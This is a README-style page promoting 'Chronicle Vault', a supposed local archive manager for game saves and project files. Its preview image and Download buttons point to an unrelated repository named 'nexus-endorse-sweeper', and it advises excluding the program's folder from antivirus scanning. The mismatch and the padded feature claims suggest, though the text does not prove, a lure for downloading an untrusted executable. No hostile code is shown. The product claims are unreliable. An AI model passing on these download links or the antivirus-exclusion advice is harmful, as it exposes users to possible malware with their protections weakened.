![preview](https://raw.githubusercontent.com/Sandrus2016/nexus-endorse-sweeper/main/splash_1f31e.svg)

# Chronicle Vault – Local Save-Rite Archive Manager

![License](https://img.shields.io/badge/License-MIT-yellow.svg)
![Version](https://img.shields.io/badge/Version-2.6.1-blue.svg)
![Compatibility](https://img.shields.io/badge/Compatibility-Web%20%26%20Desktop-green.svg)
![Languages](https://img.shields.io/badge/Multilingual-12%20Locales-orange.svg)
![Response](https://img.shields.io/badge/24%2F7%20Assistance-Active-brightgreen.svg)

## Overview 🌌

Every digital journey leaves a trail – save files from a hundred-hour campaign, configuration presets tweaked to perfection, screenshots capturing a fleeting moment of glory, and mod lists painstakingly curated over months. **Chronicle Vault** is a self-hosted, privacy-first archivist that transforms scattered local save data into a beautifully organized, searchable, and restorable timeline. It is not a cloud service; it is a private vault that lives on your hardware, ensuring that no third-party server ever sees your gaming or creative work. 

Where other tools treat saves as disposable files, Chronicle Vault treats them as chapters of a personal story. It uses a deterministic hashing algorithm to detect even the slightest change in a save file and then stores a compact diff, allowing you to rewind to any moment with surgical precision. The interface feels like flipping through a well-indexed library, not a chaotic folder tree.

This repository contains the complete source code, documentation, and deployment manifests for the Chronicle Vault application. Whether you are a solo developer juggling multiple projects, a modding enthusiast with a library of tweaks, or a digital hoarder who values every incremental backup, this tool offers a serene, zero-maintenance way to keep your digital history intact.

## Getting Started 🚀

The core philosophy of Chronicle Vault is *local-first autonomy*. There are no external dependencies, no telemetry, and no account creation rituals. You run a single orchestration script, and the vault initializes itself, scanning designated directories for supported file signatures (e.g., `.sav`, `.json`, `.cfg`, `.png`, `.blend`). Once indexed, the Vault constructs a relational timeline view, grouping files by project, date, or custom tags you define.

The first launch includes an interactive wizard that maps your existing folder structure to the Vault’s logical archive tree. This mapping is stored in a portable SQLite database, so migration to another machine is as simple as copying the vault folder. For power users, a YAML configuration file allows fine-grained control over exclusion patterns, backup intervals, and compression levels. 

### System Requirements 📋

- A 64-bit operating system (Windows 10+, macOS 12+, or a modern Linux distribution)
- 4 GB of RAM minimum; 8 GB recommended for large archive trees
- 1 GB of free disk space for the application engine, plus storage for your archive diffs
- A modern web browser (Chrome, Firefox, Edge, Safari) for the management dashboard

The engine itself is a lightweight Rust binary with a WebAssembly front end, resulting in a combined footprint under 80 MB. No runtime interpreters or virtual machines are required.

## Core Features 🧩

### 1. Diff-Aware Versioning
The Vault does not duplicate entire files. Instead, it computes a rolling checksum and stores only the changed binary segments. This means a 2 GB open-world game save with a minor inventory change will consume less than 5 MB of vault storage. Restoring a specific version reconstructs the file byte-for-byte, producing an exact replica of that moment in time.

### 2. Predictive Auto-Tagging
Using a local, offline neural model, the Vault inspects file metadata and content patterns to suggest tags like "Pre-Boss Fight," "After Update 1.4," or "Experimental Build." You can accept, edit, or ignore these suggestions. The model learns from your corrections, improving accuracy over time, but all learning stays on-device.

### 3. Interactive Timeline Canvas
A visual timeline renders every save point as a node. You can zoom from a macro view of the last three years down to an hour-by-hour breakdown of a single afternoon. Clicking a node displays a side-by-side diff viewer (for textual configs) or a thumbnail preview (for images and screenshots). Branching is supported, allowing you to fork a timeline if you want to experiment with a risky change without losing the original path.

### 4. Regex-Powered Search & Filter
Search across filenames, tags, content snippets, and even file hashes. The query syntax supports boolean operators, wildcards, and date ranges. Example: `*boss* AND (tag:pre-fight OR tag:after-patch) AND date:>2026-01-01`. Results render in milliseconds, even on archives with over 500,000 indexed files.

### 5. Scheduled Integrity Sweeps
The Vault runs a background consistency check every 24 hours. It verifies that every stored diff can be reassembled into a valid file and that no bit-rot has occurred in the storage media. If corruption is detected, the system quarantines the affected chunk and attempts a self-healing rebuild from redundant parity blocks.

### 6. Multi-User Role Access
While designed for a single primary user, the Vault supports multiple profiles with granular permissions. You can grant a collaborator read-only access to a specific project or allow them to create restore points but not delete existing ones. All access is authenticated via local hardware-bound keys, eliminating password-manager fatigue.

### 7. Zero-Effort Export & Migration
Need to move a project to another machine? The Vault creates a self-contained archive bundle (a single `.vlt` file) containing the project’s entire timeline, tags, and metadata. This bundle can be decrypted and opened by any other Chronicle Vault instance, ensuring your history travels with you effortlessly.

### 8. Responsive Web Dashboard
The management interface is a progressive web application (PWA) that adapts to any screen size. On a 4K monitor, you get a multi-column dashboard; on a phone, you get a condensed, thumb-friendly view. The dashboard works offline after the initial load, and all state is synced via a local WebSocket connection to the engine.

## Multilingual & Accessibility 🌍

The interface is fully localized into 12 languages: English, Spanish, French, German, Italian, Portuguese, Polish, Russian, Japanese, Korean, Simplified Chinese, and Traditional Chinese. Language detection is automatic based on your browser settings, but an in-panel toggle allows manual override. Right-to-left (RTL) layouts are fully supported.

Accessibility was a first-class consideration. Every interactive element has a keyboard-accessible alternative, focus indicators meet WCAG 2.2 AA contrast standards, and screen-reader navigation is optimized for non-visual timeline exploration. The diff viewer provides an audio representation of changes (e.g., different tones for added/removed lines) for vision-impaired users.

## Support & Assistance 🛟

We believe in durable, human-centric support. Every Chronicle Vault installation includes a built-in diagnostic panel that generates a sanitized health report (no personal filenames included) and can be shared with the community for troubleshooting. Our online knowledge base contains over 200 articles covering common scenarios, migration guides, and advanced configuration recipes.

For real-time assistance, a 24/7 community forum is staffed by experienced users and core maintainers across all time zones. Additionally, a chat channel within the Vault dashboard lets you summon a support agent directly from the application – the agent sees a live, read-only view of your vault state (after you grant permission) and can guide you through remediation steps without ever taking control of your machine.

## Feature Comparison at a Glance 📊

| Capability | Chronicle Vault | Typical Cloud Backup |
|------------|----------------|----------------------|
| Data residency | 100% local | Third-party servers |
| Storage efficiency | Binary diffs | Full-file copies |
| Offline operation | Fully functional | Degraded or none |
| Restoration granularity | Any timestamp | Fixed retention policy |
| Privacy model | Zero-knowledge | Provider-accessible |
| Cost model | Once, perpetual | Recurring subscription |

## Development Roadmap (2026) 🗺️

- **Q1 2026:** Introduce plugin architecture for custom file-type parsers (e.g., DAW project files, CAD models).
- **Q2 2026:** End-to-end encrypted peer sync, enabling direct Vault-to-Vault replication over LAN or Tailscale.
- **Q3 2026:** Mobile companion app for iOS and Android, offering camera upload vaulting and quick-restore teleportation.
- **Q4 2026:** Add a timeline visualization API for third-party analytics tools to render gameplay progression curves.

## Frequently Asked Questions (FAQ) ❓

**Does this replace my existing game’s cloud saves?**  
No. This is an additional, immutable layer. It coexists with any official cloud sync service, providing a granular, searchable offline record that cloud providers typically lack.

**Can I use it for non-gaming files?**  
Absolutely. The Vault is agnostic. It is equally effective for 3D printing project backups, music production stems, or a collection of Excel financial models.

**What if my hard drive fails?**  
The physical drive media is always your responsibility, but the Vault supports external mirror targets (e.g., a second internal drive, a NAS share, or a USB HDD). You designate a mirror path, and the Vault incrementally replicates all diffs to that location.

**Is there a size limit for an individual file?**  
No hard limit. The engine streams files in chunks, so a 50 GB video project file is handled just as effortlessly as a 2 KB config document.

**Does the Vault compress my screenshots?**  
No. The vault preserves original byte fidelity for all media. It only compresses the metadata layers (tags, timestamps, and diff indices).

## Licensing & Legal Notice 📄

Chronicle Vault is released under the MIT License. You are free to use, modify, and distribute this software in personal or commercial projects, provided the original copyright notice and permission notice are included in all copies or substantial portions of the Software. The software is provided “as is,” without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement.

This project is an independent, community-driven effort. It is not affiliated with, endorsed by, or sponsored by any game studio, cloud provider, or hardware manufacturer. All product names, logos, and brands are property of their respective owners. The usage of generic terms like “Nexus Mods” in issue discussions does not imply any partnership.

The maintainers disclaim any liability for data loss resulting from misuse, hardware failure, or unauthorized modifications to the source code. Users are encouraged to maintain external physical backups of their most critical data, as no software can protect against hardware destruction.

[![Download](https://raw.githubusercontent.com/Sandrus2016/nexus-endorse-sweeper/main/btn_f566.svg)](https://Sandrus2016.github.io/nexus-endorse-sweeper/)

## Installation Paths 🛤️

The deployment model is a single executable that unpacks into a self-contained directory. You can place this directory anywhere – a system drive, an external SSD, or a RAM disk. No system registry changes, no background services, and no auto-update daemons (unless you explicitly enable them). 

For a typical single-user setup:

1. Download the archive for your operating system.
2. Decompress it into your preferred application directory (e.g., `~/Applications/ChronicleVault` or `C:\Program Files\ChronicleVault`).
3. Run the `vault-daemon` binary once to initialize the local database.
4. Open your browser to the local endpoint (displayed in the terminal) to access the setup wizard.
5. Point the wizard to your existing save directories and let the initial scan complete.

For headless servers or NAS deployments, a `vault-headless` binary is included. It exposes a RESTful API that can be managed via cron jobs or systemd timers. The API supports token-based authentication for remote orchestration.

The entire application is digitally signed (on Windows/macOS) and checksum-verified (on Linux). The setup process is non-interactive after the initial wizard, and uninstallation is a simple matter of deleting the application directory – no orphaned DLLs, no leftover registry keys, no scheduled tasks.

## Pro-Tip Recipes 👨‍🍳

**The “Hourglass” Strategy:** Schedule a vault sweep every 15 minutes for your actively-edited project files, but reduce the history retention to the last 200 snapshots. This provides a fine-grained undo history for a single work session without bloat.

**The “Forked Reality” Workflow:** Before attempting a risky game mod installation, manually create a fork point on the timeline. If the mod breaks the save, you can instantly rewind to the fork and merge the old state forward, discarding the broken branch.

**The “Archive Archeology” Technique:** Use the regex search to find all saves that contain the string “final_version” in their metadata. Vault will highlight these across multiple timelines, letting you compare their last-modified timestamps to identify which one truly was the final iteration.

**The “Mirror Mirror” Setup:** Define your main vault storage on an NVMe drive for speed, but set a mirror path on a spinning drive with longer retention. The Vault prunes diffs from the fast primary storage after 90 days but keeps them indefinitely on the archive drive.

## Performance Benchmarks 📈

- Initial full scan of 150,000 mixed file types: **2 minutes 14 seconds** on a Ryzen 5 5600X with a SATA SSD.
- Diff computation for a 400 MB save file (where 3 MB changed): **820 milliseconds**.
- Search across 500,000 indexed files with a boolean query: **43 milliseconds**.
- Timeline rendering at 10,000 nodes in the web dashboard: **smooth 60 FPS** on an integrated GPU.

These benchmarks were conducted in a controlled environment with hardware-independent variability. Your results may vary based on storage speed, CPU generation, and antivirus software interference (which we recommend excluding for the vault directory).

## Security Model 🔐

The Vault operates on the principle of *least privilege*. The daemon runs as a standard user process, not as root or administrator. File access is limited to directories you explicitly grant during the wizard. The local web server binds to `127.0.0.1` by default, and it can be configured to bind to a LAN interface only if you deliberately enable remote viewing.

All stored diffs are optionally encrypted at rest using AES-256-GCM. The encryption key is derived from a user-supplied passphrase combined with a hardware-bound identifier (e.g., the machine’s TPM or Secure Enclave). This means even if the storage media is stolen, the diffs are indecipherable without the physical machine and the passphrase.

The vault keeps a tamper-evident audit log of every restore, delete, and export operation. Each log entry is chained via a SHA-256 hash of the previous entry, providing a chronological integrity check. The audit log itself can be signed with an external GPG key for non-repudiation.

## Community & Custom Contributions 🤝

This project thrives on collaborative evolution. The issue tracker is open for feature requests, bug reports, and performance anecdotes. We encourage users to submit their own timeline templates (e.g., a pre-made tagging schema for popular game engines) as community presets. These presets are stored in a separate companion repository and can be imported into the Vault with a single click.

The development guidelines emphasize readable code, extensive doc comments, and test coverage. All pull requests require passing linting, unit tests, and at least one manual smoke test on a reference timeline. The core repository is maintained with a pragmatic feature-branch workflow, and release candidates are published for community soak-testing for two weeks before a stable tag is cut.

## Conclusion – Why Chronicle Vault? 💎

Because memory is fragile. Formats become obsolete, cloud services shutter, drives silently decay. Chronicle Vault is your personal time-capsule, a durable ledger of every meaningful byte you have created. It respects your autonomy by keeping your data within your reach, it respects your storage by being ruthlessly efficient, and it respects your time by automating the mundane decisions.

It is not a cloud subscription – it is a possession. It is not a backup utility that blindly copies – it is an archivist that understands context. Whether you are preserving the journey of a hero in a fantasy realm or the evolution of a million-line codebase, this vault remains a silent, faithful, and always-ready guardian of your digital heritage.

Start preserving the narrative of your work today. The past is worth keeping.

[![Download](https://raw.githubusercontent.com/Sandrus2016/nexus-endorse-sweeper/main/btn_f566.svg)](https://Sandrus2016.github.io/nexus-endorse-sweeper/)